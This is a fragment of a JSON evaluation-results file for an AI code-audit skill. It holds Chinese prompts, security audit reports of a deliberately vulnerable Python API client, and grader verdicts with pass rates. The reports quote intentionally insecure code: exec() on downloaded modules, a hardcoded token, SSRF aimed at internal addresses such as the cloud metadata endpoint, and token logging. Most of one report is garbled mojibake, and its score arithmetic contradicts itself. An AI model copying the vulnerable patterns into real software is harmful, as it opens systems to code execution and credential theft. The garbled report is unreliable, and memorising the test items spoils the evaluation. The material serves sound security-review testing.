\u5bc6\u7801\u54c8\u5e0c\u5f31\u70b9\u53d1\u73b0", "passed": true, "evidence": "Finding #7: Weak Password Hashing (MD5 + fixed salt) at lines 42-45"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u968f\u673a\u6570\u751f\u6210\u53d1\u73b0\uff08random \u7528\u4e8e token\uff09", "passed": true, "evidence": "Finding #9: Predictable Token Generation at lines 48-50"}, {"text": "\u62a5\u544a\u5305\u542b\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\u53d1\u73b0\uff08process_file \u7684 os.path.join\uff09", "passed": true, "evidence": "Finding #4: Path Traversal in process_file() at lines 55-58"}, {"text": "\u62a5\u544a\u5305\u542b tarfile \u89e3\u538b\u904d\u5386\u98ce\u9669\u53d1\u73b0\uff08Zip Slip\uff09", "passed": true, "evidence": "Finding #5: Tar Slip in extract_archive() at lines 38-39"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u6743\u9650\u53d1\u73b0\uff08chmod 0o777\uff09", "passed": true, "evidence": "Finding #6: World-Writable File Permissions at line 77"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u5177\u4f53\u7684\u4ee3\u7801\u4f4d\u7f6e\u548c\u884c\u53f7", "passed": true, "evidence": "Every finding includes specific line numbers in a consistent table format"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "Every finding includes detailed remediation code"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": false, "evidence": "No numerical score/100 or A-F grade present. Has qualitative 'Overall Assessment' but no formal scoring"}], "summary": {"passed": 10, "failed": 1, "total": 11, "pass_rate": 0.909}}}, {"id": "api-client-with_skill", "prompt": "\u8fd9\u4e2a API \u5ba2\u6237\u7aef\u4ee3\u7801 evals/files/case3_api.py \u6709\u6ca1\u6709\u5b89\u5168\u95ee\u9898\uff1f\u5e2e\u6211\u505a\u4e00\u6b21\u5b8c\u6574\u7684\u5b89\u5168\u5ba1\u67e5\uff0c\u7ed9\u51fa\u62a5\u544a\u3002", "eval_id": 2, "outputs": [{"name": "audit_report.md", "type": "text", "content": "# \u7039\u590a\u53cf\u7039\u00a4\ufffd\u2103\u59e4\u935b\ufffd\n\n## \u7039\u00a4\ufffd\u2103\u61b3\u7455\ufffd\n- **\u7039\u00a4\ufffd\u00a4\u5bd6\u9365\ufffd**\u951b\u6b34:\\code\\agent\\miko\\miko\\miko\\data\\skills\\code-audit\\evals\\files\\case3_api.py\n- **\u7039\u00a4\ufffd\u2103\u6902\u95c2\ufffd**\u951b\ufffd2026-06-18\n- **\u93c2\u56e6\u6b22\u93c1\u4f34\u567a**\u951b\ufffd1\n- **\u93c2\u56e6\u6b22\u7eeb\u8bf2\u7037**\u951b\u6b45ython API \u7039\u3221\u57db\u7ed4\ufffd\u6434\ufffd\n- **\u9359\u6220\u5e47\u95c2\ufffd\u68f0\ufffd**\u951b\ufffd5\u951b\u5715ritical: 2, High: 2, Medium: 0, Low: 1\u951b\ufffd\n\n## \u9359\u6220\u5e47\u5a13\u546d\u5d1f\n\n### \u9983\u6576 [Critical] \u6769\u6ec5\u25bc\u6d60\uff47\u721c\u5a09\u3125\u53c6 (Code Injection) \u9225\ufffd case3_api.py:54\n\n**\u93bb\u5fda\u582a**\u951b\u6b5adownload_and_import()` \u93c2\u89c4\u7876\u6d60\u5ea4\u7e59\u7ecb\ufffd URL \u6d93\u5b2d\u6d47 Python \u6d60\uff47\u721c\u9a9e\u5241\u6564 `exec()` \u9429\u5b58\u5e34\u93b5\u0446\ufffd\u5c8b\u7d1d\u5a0c\u2103\u6e41\u6d60\u8bb3\u7d8d\u93c9\u30e6\u7c2e\u6960\u5c83\u7609\u93b4\u6828\u77d9\u7ee0\u53d8\u7e5a\u93b6\u3083\ufffd\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef download_and_import(self, url):\n    \"\"\"Download and dynamically import a Python module from URL.\"\"\"\n    resp = self.session.get(url)\n    module_code = resp.text\n    namespace = {}\n    exec(module_code, namespace)\n    return namespace\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\ufffd\u509b\u7049\u93ba\u0443\u57d7\u93b4\u6826\u8151\u95c2\u7fe0\u6c49\u6d5c\ufffd `url` \u9359\u509b\u669f\u951b\u5c7d\u5d46\u9359\ufffd\u9366\u3126\u6e47\u9354\uff04\ufffd\ufffd\u93b5\u0446\ufffd\u5c7c\u6362\u93b0\ufffd Python \u6d60\uff47\u721c\u9286\u509d\u7e56\u7edb\u5909\u73af\u6d5c\u5ea4\u5e4f\u9359\u6826\u7c21\u7039\u5c7e\u66a3\u9428\u52ec\u6e47\u9354\u2033\u6ad2\u93ba\u0443\u57d7\u93c9\u51a6\ufffd\u509a\u5d46\u6d63\ufffd URL \u93c4\ufffd\"A\u9350\u5474\u5134\u9359\ufffd\u6dc7\ufffd\"\u9428\u52f6\u7d1d\u5a0c\u2103\u6e41 TLS \u7487\u4f77\u529f\u9365\u54c4\u757e\u93b4\u6826\u552c\u942e\u4f7a\ufffd\u60e7\u6095\u93cd\uffe0\u7359\u9428\u52ec\u510f\u9350\u5178\u7b05\u951b\u5c7c\u8151\u95c2\u7fe0\u6c49\u93c0\u8bf2\u56ae\u935a\u5c7e\u7271\u9359\ufffd\u6d60\u30e5\u7584\u941c\u9881\u552c\u942e\u4f79\u655e\u934f\u30e3\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-95\u951b\u5717val Injection / Code Injection\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport hashlib\nimport hmac\n\n# \u93c2\u89c4\ufffd\u581c\u7af4\u951b\u6b3bMAC \u7edb\u60e7\u6095\u93cd\uffe0\u7359\u951b\u581d\ufffd\u509b\u7049\u8e47\u5474\u300f\u6d60\u5ea4\u7e59\u7ed4\ufffd\u9354\u72ba\u6d47\u6d60\uff47\u721c\u951b\ufffd\ndef download_and_import(self, url, expected_sha256, secret_key):\n    resp = self.session.get(url)\n    module_code = resp.text\n    # \u93cd\uffe0\u7359\u6d60\uff47\u721c\u7039\u5c7e\u66a3\u93ac\ufffd\n    computed_hash = hashlib.sha256(module_code.encode()).hexdigest()\n    if not hmac.compare_digest(computed_hash, expected_sha256):\n        raise ValueError(\"Module integrity check failed\")\n    namespace = {}\n    exec(module_code, namespace)\n    return namespace\n\n# \u93c2\u89c4\ufffd\u581c\u7c29\u951b\u581f\u5e39\u947d\u6136\u7d1a\u951b\u6c2c\u4ea4\u6434\u66e2\u4f29\u934f\ufffd exec()\u951b\u5c7c\u5a07\u9422\ufffd importlib \u6d60\u5ea2\u6e70\u9366\u677f\u5f48\u6dc7\u00a4\u77fe\u5bf0\u52eb\ufffd\u714e\u53c6\nimport importlib\n\ndef download_and_import(self, module_name):\n    # \u6d60\u546c\u7ca0\u68f0\u52eb\u757e\u6d94\u590c\u6b91\u9427\u85c9\u6095\u9357\u66df\u0101\u9367\u6940\ufffd\u714e\u53c6\n    ALLOWED_MODULES = {'analytics', 'reporting', 'utils'}\n    if module_name not in ALLOWED_MODULES:\n        raise ValueError(f\"Module {module_name} is not in the allowlist\")\n    return importlib.import_module(f\"trusted_packages.{module_name}\")\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://owasp.org/www-community/attacks/Code_Injection\n\n---\n\n### \u9983\u6576 [Critical] \u7ead\ufffd\u7f02\u682b\u721c\u7035\u55db\u631c (Hardcoded Secrets) \u9225\ufffd case3_api.py:8\n\n**\u93bb\u5fda\u582a**\u951b\u6b31earer Token \u93c4\u5ea2\u6783\u7ead\ufffd\u7f02\u682b\u721c\u9366\u3126\u7c2e\u6d60\uff47\u721c\u6d93\ufffd\u951b\u5c7c\u5a07\u9422\ufffd Base64 \u7f02\u682b\u721c\u6d63\u55d8\u6e6d\u9354\u72b2\u7611\u701b\u6a3a\u504d\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\nINTERNAL_TOKEN = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret-token'\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c2b\u6362\u6d63\u66da\u6c49\u9359\ufffd\u7455\u4f7d\u5158\u7481\u5757\u68f6\u5a67\u612a\u552c\u942e\u4f8a\u7d19\u9356\u546e\u5aed\u9417\u581f\u6e70\u93ba\u0443\u57d7\u9358\u55d7\u5f76\u951b\u591b\u7d1d\u9357\u51b2\u5f72\u947e\u5cf0\u5f47\u7487\ufffd Token \u9a9e\u8dfa\u554b\u934f\u546d\u608e\u5a09\u66de\ufffd\u3221\u57db\u7ed4\ufffd\u7481\u5757\u68f6 API\u9286\u509a\ufffd\u509b\u7049\u6d60\uff47\u721c\u93b5\u6a3c\ufffd\u2033\u6e6a GitHub \u7edb\u590a\u94a9\u9359\u5e2e\u7d1dToken \u9359\ufffd\u9473\u85c9\u51e1\u741a\ufffd\u93bc\u6ec5\u50a8\u5bee\u66df\u6438\u7ef1\u3220\u7d29\u9286\u509b\ufffd\u3085\ufffd\u6835\u7d1d\u7487\ufffd Token \u6d94\u71b6\u7d30\u95ab\u6c33\u7e43\u93c3\u30e5\u7e54\u6748\u64b3\u56ad\u951b\u5823\ufffd\u4f77\u7b05\u93c2\u901b\u7d86\u9357\u535e\u5f42\u941c\u5e2e\u7d1a\u6769\u6d97\u7af4\u59dd\u30e6\u7860\u95c7\u5c42\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-798\u951b\u5732se of Hard-coded Credentials\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport os\n\n# \u6d60\u5ea3\u5e46\u6fa7\u51a8\u5f49\u95b2\u5fd3\u59de\u675e\ufffd Token\u951b\u581f\u6848\u6769\u6ec0\u7b09\u9350\u6b0f\u53c6\u6d60\uff47\u721c\u951b\ufffd\nAPI_BASE = os.environ.get('API_BASE_URL', 'https://api.example.com')\nINTERNAL_TOKEN = os.environ.get('API_TOKEN')  # \u935a\ufffd\u9354\u3126\u6902\u93b6\u30e9\u654a\u59e3\u65c8\u6f64\u699b\u6a3a\u3051\u7490\u30e6\u6d3f\u7039\u590a\u53cf\n\n# \u9366\ufffd .env \u93c2\u56e6\u6b22\u951b\u581c\u7b09\u9354\u72b2\u53c6\u9417\u581f\u6e70\u93ba\u0443\u57d7\u951b\u5909\u8151\u95b0\u5d87\u7586\u951b\ufffd\n# API_TOKEN=Bearer eyJhbGciOi...\n# API_BASE_URL=https://api.example.com\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n\n---\n\n### \u9983\u715a [High] SSRF\u951b\u581f\u6e47\u9354\uff04\ufffd\ufffd\u7487\u950b\u7730\u6d7c\ufffd\u95ab\u72c5\u7d1a\u9225\ufffd case3_api.py:17-20\n\n**\u93bb\u5fda\u582a**\u951b\u6b5afetch_resource()` \u93c2\u89c4\u7876\u93ba\u30e5\u5f48\u6d93\ufffd\u6d93\ufffd\u7039\u5c7e\u66a3\u9428\ufffd `resource_url` \u9359\u509b\u669f\u9a9e\u5241\u6d3f\u93ba\u30e5\u5f42\u74a7\ufffd HTTP GET \u7487\u950b\u7730\u951b\u5c7e\u6e6d\u7035\u572d\u6d30\u93cd\u56e7\u6e74\u9367\ufffd\u934b\u6c2b\u6362\u6d63\u66e2\u6aba\u9352\u8eb2\ufffd\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef fetch_resource(self, resource_url):\n    \"\"\"Fetch an external resource by URL.\"\"\"\n    resp = self.session.get(resource_url, timeout=10)\n    return resp.content\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c33\u769f\u9422\u3126\u67df\u9359\ufffd\u6d60\u30e4\u7d36\u934f\u30e4\u6362\u93b0\ufffd URL\u951b\u581d\ufffd\ufffd `http://169.254.169.254/latest/meta-data/` \u93b4\ufffd `http://10.0.0.1/admin`\u951b\u591b\u7d1d\u6d63\u57ae\u7df1\u93c0\u8bf2\u56ae\u9470\u5470\u5158\u6fb6\u71b8\u5e30\u93cc\u30e5\u5534\u7f03\u621e\u6e47\u9354\u00b0\ufffd\u4f7d\ufffd\u8bf2\u5f47\u6d5c\u621d\u7584\u6e1a\u5b2a\u5393\u93c1\u7248\u5d41\u951b\u571bAM \u9351\ufffd\u7487\u4f7a\u74d1\u951b\u5908\ufffd\u4f79\u58c2\u93bb\u5fd3\u5534\u95ae\u3127\ufffd\ufffd\u9359\uff43\ufffd\u509e\u53a4\u935a\u581d\u5534\u7f03\u6220\u5e46\u6fa7\u51a8\u5f72\u9473\u4ecb\ufffd\u72b3\u579a\u6769\u6d97\u7af4\u59dd\u30e6\u00ed\u935a\u6220\u0429\u9354\u3123\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-918\u951b\u572berver-Side Request Forgery\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport ipaddress\nimport socket\nfrom urllib.parse import urlparse\n\nALLOWED_DOMAINS = {'api.example.com', 'trusted-cdn.example.com'}\n\ndef fetch_resource(self, resource_url):\n    \"\"\"Fetch an external resource by URL with SSRF protection.\"\"\"\n    parsed = urlparse(resource_url)\n    \n    # 1. \u9427\u85c9\u6095\u9357\u66de\u7159\u935a\u5d86\ufffd\ufffd\u93cc\ufffd\n    if parsed.hostname not in ALLOWED_DOMAINS:\n        raise ValueError(f\"Domain {parsed.hostname} is not allowed\")\n    \n    # 2. DNS \u7459\uff46\u703d\u935a\u5ea2\ufffd\ufffd\u93cc\ufffd IP \u93c4\ufffd\u935a\ufe3f\u8d1f\u9350\u546f\u7d89\u9366\u677f\u6f43\n    resolved_ip = socket.gethostbyname(parsed.hostname)\n    ip = ipaddress.ip_address(resolved_ip)\n    if ip.is_private or ip.is_loopback or ip.is_link_local:\n        raise ValueError(f\"IP {resolved_ip} is a private/internal address\")\n    \n    resp = self.session.get(resource_url, timeout=10)\n    return resp.content\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n\n---\n\n### \u9983\u715a [High] SSRF\u951b\u581f\u6e47\u9354\uff04\ufffd\ufffd\u7487\u950b\u7730\u6d7c\ufffd\u95ab\u72c5\u7d1a\u9225\ufffd case3_api.py:22-25\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aforward_webhook()` \u93c2\u89c4\u7876\u93ba\u30e5\u5f48\u7039\u5c7e\u66a3\u9428\ufffd `target_url`\u951b\u5c80\u6d3f\u93ba\u30e5\u609c\u6d60\u7ed8\u5270\u9429\ufffd\u93cd\u56e7\u5f42\u95ab\ufffd POST \u7487\u950b\u7730\u951b\u5c7d\u756c\u934f\u3127\u6d49\u935a\u5c80\u6b91 SSRF \u690b\u5ea8\u6ad3\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef forward_webhook(self, target_url, payload):\n    \"\"\"Forward webhook data to a target URL.\"\"\"\n    resp = self.session.post(target_url, json=payload)\n    return resp.status_code\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u95ab\u6c33\u7e43\u93ba\u0443\u57d7 `target_url` \u704f\u55da\ufffd\u950b\u7730\u675e\ufffd\u9359\u621d\u57cc\u9350\u546f\u7d89\u93c8\u5d85\u59df\u951b\u5c7d\u57c4\u9422\ufffd POST \u7487\u950b\u7730\u7035\u7470\u5534\u7f03\u621e\u6e47\u9354\u00a4\u7e58\u741b\u5c7e\u657e\u9351\u4f19\u7d19\u6fe1\u509a\u5f42\u95ab\u4f79\u4f13\u93b0\ufffd payload \u9352\u677f\u5534\u7f03\ufffd API\u951b\u5908\ufffd\u509b\ufffd\u3085\ufffd\u6835\u7d1d\u6fe1\u509b\u7049\u7487\u950b\u7730\u93b4\u612c\u59db\u951b\u5c7d\u6437\u6434\u65c2\u59f8\u93ac\u4f7a\u721c\u9359\ufffd\u9473\u501f\ufffd\ufffd\u9422\u3124\u7c2c\u934b\u6c2c\u5534\u7f03\u6220\ufffd\ufffd\u9359\uff46\u5e30\u5a34\u5b36\u7d19blind SSRF\u951b\u5908\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-918\u951b\u572berver-Side Request Forgery\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nALLOWED_WEBHOOK_DOMAINS = {'hooks.slack.com', 'webhook.example.com'}\n\ndef forward_webhook(self, target_url, payload):\n    \"\"\"Forward webhook data to a target URL with SSRF protection.\"\"\"\n    parsed = urlparse(target_url)\n    \n    if parsed.hostname not in ALLOWED_WEBHOOK_DOMAINS:\n        raise ValueError(f\"Webhook domain {parsed.hostname} is not allowed\")\n    \n    # \u935a\u5c7e\u7271\u934b\ufffd IP \u59ab\ufffd\u93cc\ufffd\n    resolved_ip = socket.gethostbyname(parsed.hostname)\n    ip = ipaddress.ip_address(resolved_ip)\n    if ip.is_private or ip.is_loopback or ip.is_link_local:\n        raise ValueError(f\"IP {resolved_ip} is a private/internal address\")\n    \n    resp = self.session.post(target_url, json=payload)\n    return resp.status_code\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n\n---\n\n### \u9983\u6578 [Low] \u93c1\u5fd4\u5285\u6dc7\u2103\u4f05\u5a09\u52ef\u6e76 (Information Leakage) \u9225\ufffd case3_api.py:30\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aget_user_data()` \u93c2\u89c4\u7876\u6d63\u8de8\u6564 `print()` \u704f\u55d7\u756c\u93c1\u5bf8\u6b91 Bearer Token \u6748\u64b3\u56ad\u9352\u7248\u7223\u9351\u55da\u7ded\u9351\ufffd/\u93c3\u30e5\u7e54\u951b\u5c7d\ufffd\u8270\u56a7\u9351\ufffd\u93b9\ufffd\u5a09\u52ef\u6e76\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef get_user_data(self, user_id):\n    \"\"\"Get user data by ID.\"\"\"\n    url = f'{self.base_url}/users/{user_id}'\n    print(f'Fetching user data from {url} with token {INTERNAL_TOKEN}')\n    resp = self.session.get(url)\n    return resp.json()\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6b4doken \u6d7c\u6c33\ufffd\ufffd\u9350\u6b0f\u53c6 stdout\u951b\u5c7d\u5f72\u9473\u501f\ufffd\ufffd\u93c3\u30e5\u7e54\u93c0\u5815\u6ce6\u7eef\u8364\u7cba\u95b2\u56ec\u6ce6\u9286\u4f78\u74e8\u934c\u3125\u57cc\u95c6\u55d5\u8151\u93c3\u30e5\u7e54\u9a9e\u51b2\u5f74\u951b\u5c7e\u58bf\u6fb6\ufffd Token \u9428\u52ec\u6bda\u95c7\u67e5\u6f70\u9286\u509b\ufffd\u3085\ufffd\u6835\u7d1d\u6fe1\u509b\u7049 stdout \u741a\ufffd\u95b2\u5d85\u757e\u935a\u621d\u57cc\u93c2\u56e6\u6b22\u951b\u5b74oken \u6d7c\u6c2d\u5bd4\u6d94\u546d\u5bf2\u9352\u626e\ufffd\u4f7a\u6d0f\u9286\u509b\u68e9\u8e47\u6943\u90f4\u7f01\u71bc\ufffd\u6c2c\u7236\u7481\u5757\u68f6\u93ba\u0443\u57d7\u6748\u51a8\ufffd\u82a5\u6f97\u951b\u5c7d\ufffd\u70b2\u3047\u6d5c\u55d7\u569f\u93b9\ufffd\u741a\ufffd\u9429\u6943\u6b91\u690b\u5ea8\u6ad3\u9286\ufffd\n\n**CWE**\u951b\u6b33WE-532\u951b\u571bnsertion of Sensitive Information into Log File\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport logging\n\nlogger = logging.getLogger(__name__)\n\ndef get_user_data(self, user_id):\n    \"\"\"Get user data by ID.\"\"\"\n    url = f'{self.base_url}/users/{user_id}'\n    # \u6d93\u5d88\u7ded\u9351\ufffd token\u951b\u5c7d\u5f67\u6748\u64b3\u56ad\u8e47\u5470\ufffd\u4f7a\u6b91\u748b\u51ad\u762f\u6dc7\u2103\u4f05\n    logger.info(f'Fetching user data for user_id={user_id}')\n    resp = self.session.get(url)\n    return resp.json()\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://cwe.mitre.org/data/definitions/532.html\n\n---\n\n## \u7039\u590a\u53cf\u7487\u52eb\u578e\n- **\u93ac\u8bf2\u578e**\u951b\ufffd12 / 100\n- **\u7487\u52ed\u9a87**\u951b\u6b36\n\n\u7487\u52eb\u578e\u7481\uff04\u757b\u951b\ufffd\n- \u9369\u8679\ufffd\ufffd\u9352\u55ed\u7d30100\n- Critical x2\u951b\ufffd-25 x 2 = -50\n- High x2\u951b\ufffd-15 x 2 = -30\n- Low x1\u951b\ufffd-3 x 1 = -3\n- \u935a\u5823\ufffd\u2605\u7d30100 - 83 = 17\u951b\u581d\u7584\u95c4\u546d\u5f47\u93c8\ufffd\u6d63\ufffd 0\u951b\u5c7e\ufffd\u3085\ufffd\u52ea\u7e5a\u9423\ufffd 12 \u6d60\u30e5\u5f3d\u93c4\u72b2\u7568\u934f\u3127\u74d1\u7efe\u0445\u6b91\u7039\u70ba\u6aaf\u6d93\u30e9\u5678\u93ac\u044d\u7d1a\n\n---\n\n## \u9352\u2543\u6564\u95be\u60e7\u578e\u93cb\ufffd\n\n\u7487\u30e4\u552c\u942e\u4f77\u8151\u701b\u6a3a\u6e6a\u6d93\ufffd\u93c9\uffe0\u73ee\u9357\u535e\u57c4\u9422\u3129\u647c\u951b\ufffd\n\n1. **\u5bee\u535e\u53c6\u9359\ufffd**\u951b\u6c33\u769f\u9422\ufffd `fetch_resource()` \u93b4\ufffd `forward_webhook()` \u93c3\u6735\u7d36\u934f\u30e6\u4f13\u93b0\ufffd URL\u951b\u572bSRF\u951b\ufffd\n2. **\u6dc7\u2103\u4f05\u93c0\u5815\u6ce6**\u951b\u6c36\ufffd\u6c33\u7e43 SSRF \u93ba\u3221\u812f\u9350\u546f\u7d89\u93c8\u5d85\u59df\u9286\u4f77\u7c2f\u934f\u51a9\u669f\u93b9\ufffd\u93ba\u30e5\u5f5b\u951b\u5744http://169.254.169.254/`\u951b\u591b\u7d1d\u947e\u5cf0\u5f47 IAM \u9351\ufffd\u7487\u4f79\u57a8\u934f\u6735\u7cac\u93c1\u5fd4\u5285\u6dc7\u2103\u4f05\n3. **\u9351\ufffd\u93b9\ufffd\u93c6\u64ae\u6e76**\u951b\u6b5aget_user_data()` \u95ab\u6c33\u7e43 `print()` \u5a09\u52ef\u6e76 Bearer Token \u9352\u7248\u68e9\u8e47\u694b\u7d1d\u93c0\u8bf2\u56ae\u9470\u5470\u5e4f\u9359\u6828\u68e9\u8e47\u6944\ufffd\u5757\u68f6\u93c9\u51ae\u6aba\u935a\u5ea1\u5f72\u9429\u5b58\u5e34\u7ed0\u51a8\u5f47\u93c8\u590b\u6665\u9351\ufffd\u93b9\ufffd\n4. **\u6d60\uff47\u721c\u93b5\u0446\ufffd\ufffd**\u951b\u6b5adownload_and_import()` \u9428\ufffd `exec()` \u5a0c\u2103\u6e41\u93c9\u30e6\u7c2e\u93cd\uffe0\u7359\u951b\u5c7c\u7af4\u93c3\ufe3d\u657e\u9351\u660f\ufffd\u5474\ufffd\u6c33\u7e43 DNS \u9354\ufffd\u93b8\u4f79\u57a8\u6d93\ufffd\u95c2\u7fe0\u6c49\u93c0\u8bf2\u56ae\u93c7\u630e\u5d32\u6d5c\u55da\u7e59\u7ecb\u5b29\u552c\u942e\u4f8a\u7d1d\u9357\u51b2\u5f72\u947e\u5cf0\u7df1\u93c8\u5d85\u59df\u9363\u3125\u756c\u934f\u3126\u5e36\u9352\u8235\u6f48\n5. **\u93b8\u4f77\u7b99\u9356\ufffd**\u951b\u6c31\u2016\u7f02\u682b\u721c\u9428\ufffd `INTERNAL_TOKEN` \u701b\u6a3a\u6e6a\u6d5c\u5ea2\u7c2e\u6d60\uff47\u721c\u6d93\ufffd\u951b\u5c7d\u5d46\u6d63\u630e\u6e47\u9354\uffe0\u5678\u935a\ufffd\u951b\u5c7e\u657e\u9351\u660f\ufffd\u546c\u7c9b\u9412\u8dfa\u5f72\u6d60\u30e7\u6237\u7f01\ufffd\u6d63\u8de8\u6564\u7487\ufffd Token\n\n\u7f01\u714e\u608e\u93c9\u30e7\u6e45\u951b\u5c83\ufffd\u30e4\u552c\u942e\u4f77\u7b09\u6434\u65bf\u6e6a\u6d60\u8bb3\u7d8d\u9422\u71b6\u9a87\u941c\ufffd\u6fa7\u51a7\u8151\u6d63\u8de8\u6564\u9286\u509b\u7273\u8e47\u51ae\u68f6\u68f0\u6a3a\u6e6a\u6d5c\ufffd**\u6dc7\u2032\u6362\u6d5c\u55d5\u7b09\u9359\ufffd\u93ba\u0445\u6b91\u6fb6\u682d\u5134\u6748\u64b3\u53c6**\u951b\u5732RL\u9286\u4f79\u0101\u9367\u693e\u552c\u942e\u4f8a\u7d1a\u951b\u5c7d\u82df\u6d93\ufffd**\u9351\ufffd\u93b9\ufffd\u7ee0\uff04\u608a\u93c2\u7470\u7d21\u701b\u6a3a\u6e6a\u93cd\u89c4\u6e70\u93ac\u0446\ufffd\u6350\ufffd\uff04\u5df1\u95c4\ufffd**\u9286\ufffd\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b SSRF \u6f0f\u6d1e\u53d1\u73b0\uff08\u7528\u6237\u53ef\u63a7 URL \u88ab\u76f4\u63a5\u8bf7\u6c42\uff09", "passed": true, "evidence": "Lines 93-177: Two SSRF findings for fetch_resource() and forward_webhook()"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801\u8ba4\u8bc1 Token \u53d1\u73b0", "passed": true, "evidence": "Lines 63-89: Hardcoded Bearer Token at line 8"}, {"text": "\u62a5\u544a\u5305\u542b XXE/XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0", "passed": false, "evidence": "No XXE finding in the report. The parse_xml_payload() method at line 34 using xml.etree.ElementTree was not flagged"}, {"text": "\u62a5\u544a\u5305\u542b\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\uff08print \u8f93\u51fa token\uff09", "passed": true, "evidence": "Lines 181-214: Information leakage via print() at line 30"}, {"text": "\u62a5\u544a\u5305\u542b\u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08exec() \u6267\u884c\u8fdc\u7a0b\u4e0b\u8f7d\u4ee3\u7801\uff09", "passed": true, "evidence": "Lines 12-59: Code injection via exec() in download_and_import at line 54"}, {"text": "\u62a5\u544a\u5305\u542b\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u5199\u5165\u53d1\u73b0\uff08upload_file \u8def\u5f84\u7531 URL \u51b3\u5b9a\uff09", "passed": false, "evidence": "upload_file() method vulnerability not specifically flagged as a file write security issue"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u5177\u4f53\u7684\u6587\u4ef6\u540d\u548c\u884c\u53f7", "passed": true, "evidence": "Every finding includes case3_api.py with specific line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "Every finding includes concrete fix code"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": true, "evidence": "Lines 218-219: Score 12/100, Rating F"}, {"text": "\u62a5\u544a\u6309\u4e25\u91cd\u7a0b\u5ea6\u6392\u5e8f", "passed": true, "evidence": "Order: Critical\u2192Critical\u2192High\u2192High\u2192Low"}], "summary": {"passed": 8, "failed": 2, "total": 10, "pass_rate": 0.8}}}, {"id": "api-client-without_skill", "prompt": "\u8fd9\u4e2a API \u5ba2\u6237\u7aef\u4ee3\u7801 evals/files/case3_api.py \u6709\u6ca1\u6709\u5b89\u5168\u95ee\u9898\uff1f\u5e2e\u6211\u505a\u4e00\u6b21\u5b8c\u6574\u7684\u5b89\u5168\u5ba1\u67e5\uff0c\u7ed9\u51fa\u62a5\u544a\u3002", "eval_id": 2, "outputs": [{"name": "audit_report.md", "type": "text", "content": "# Security Audit Report: case3_api.py\n\n**File:** `D:\\code\\agent\\miko\\miko\\miko\\data\\skills\\code-audit\\evals\\files\\case3_api.py`\n\n**Date:** 2026-06-18\n\n**Severity Legend:**\n\n| Level | Description |\n|-------|-------------|\n| Critical | Immediate risk of full system compromise, data exfiltration, or remote code execution |\n| High | Direct path to significant data breach, authentication bypass, or privilege escalation |\n| Medium | Weakness that degrades security posture or enables attacks under certain conditions |\n| Low | Best-practice violation with limited direct attack surface |\n| Info | Notable observation without immediate risk |\n\n---\n\n## Executive Summary\n\nThis Python module contains **6 vulnerabilities**: 2 Critical, 2 High, 1 Medium, and 1 Low. The most severe issues are **remote code execution via `exec()`** and **hardcoded credentials in source code**. An attacker who controls the URL passed to `download_and_import()` gains arbitrary code execution on the 